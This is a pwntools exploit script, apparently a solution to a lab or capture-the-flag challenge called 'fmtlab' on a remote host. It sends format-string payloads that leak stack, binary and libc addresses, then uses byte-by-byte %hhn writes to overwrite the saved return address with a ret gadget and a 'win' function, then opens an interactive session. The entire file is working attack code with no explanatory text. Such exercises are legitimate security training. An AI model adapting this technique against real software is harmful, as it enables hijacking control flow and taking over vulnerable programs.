from pwn import *

localhost = True

if localhost:
    #libc-2.27.so
    csu_init = 0x80009c0
    libc_start_main = 0x21b10
    libc_start_main_offset = 231
    libc_ret = 0x8aa
    win = 0x80008f2
    server = process('./sourcecode/fmtlab')
else:
    #libc-2.29.so
    csu_init = 0x80012c0
    libc_start_main = 0x26a80
    libc_start_main_offset = 235
    libc_ret = 0x2535f
    win = 0x8001201
    server = remote('140.112.31.97',30104)

server.sendlineafter('message : ', '%14$p%12$p%15$p')
leaks = server.recvuntil('Your',drop=True).split(b'0x')[1:]
code_base = int(leaks[0],16) - csu_init
rbp_offset = 224
main_rbp = int(leaks[1],16) - rbp_offset
libc_base = int(leaks[2],16) - libc_start_main - libc_start_main_offset

for i in range(8):
    target = ((libc_base + libc_ret) >> (i * 8)) & 0xff
    if target > 0:
        msg = f'%{target}c%10$hhn'.encode().ljust(0x10, b'\x00') + p64(main_rbp + 0x8 + i)
    else:
        msg = f'%10$hhn'.encode().ljust(0x10, b'\x00') + p64(main_rbp + 0x8 + i)
    server.sendlineafter('message : ',msg)
    
for i in range(8):
    target = ((code_base + win) >> (i * 8)) & 0xff
    if target > 0:
        msg = f'%{target}c%10$hhn'.encode().ljust(0x10, b'\x00') + p64(main_rbp + 0x10 + i)
    else:
        msg = f'%10$hhn'.encode().ljust(0x10, b'\x00') + p64(main_rbp + 0x10 + i)
    server.sendlineafter('message : ',msg)
        
server.sendlineafter('message : ',f'%10$n'.encode().ljust(0x10,b'\x00')+p64(main_rbp-0x34))

server.interactive()